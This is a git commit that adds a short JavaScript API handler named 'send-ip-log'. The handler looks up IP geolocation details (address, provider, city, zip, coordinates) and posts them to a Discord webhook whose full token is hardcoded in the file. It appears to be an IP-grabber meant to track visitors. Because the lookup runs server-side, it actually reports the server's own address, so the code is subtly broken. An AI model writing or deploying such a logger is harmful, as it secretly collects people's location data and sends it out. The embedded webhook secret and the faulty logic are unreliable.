a5cb58a8b38e12c0206601612c3bb7d97b721f93
Vampwire123 <boriszarkov4@gmail.com>
2025-04-18 09:27:56 -0700

    Create send-ip-log.js

---
+++ api/send-ip-log.js
@@ -0,0 +1,27 @@
+export default async function handler(req, res) {
+    const ipRes = await fetch('https://ip-api.com/json/');
+    const ipData = await ipRes.json();
+
+    const webHookUrl = "https://discord.com/api/webhooks/1362823741712765019/wheCSfur8rkcpw-dv_BdYImZP-o8mPJ45s30tCY7J98I7iMU-t2I59z_GWVUoThPFzGF";
+
+    const countryCode = ipData.countryCode.toLowerCase();
+
+    const params = {
+        username: "IP Log",
+        avatar_url: "",
+        content: `__**🌐 IP Address:**__\n\`${ipData.query}\`\n\n` +
+                 `__**📞 Provider:**__\n${ipData.org} (${ipData.as})\n\n` +
+                 `__**🗺 Timezone:**__\n${ipData.timezone}\n\n` +
+                 `__**🏳 Country and Region:**__\n${ipData.country} - ${ipData.regionName}\n\n` +
+                 `__**🏙 Zip Code & City:**__\n${ipData.zip} ${ipData.city}\n\n` +
+                 `__**📍 Location:**__\n**Longitude:** ${ipData.lon}\n**Latitude:** ${ipData.lat}`
+    };
+
+    await fetch(webHookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(params),
+    });
+
+    res.status(200).json({ message: "IP info sent to Discord." });
+}
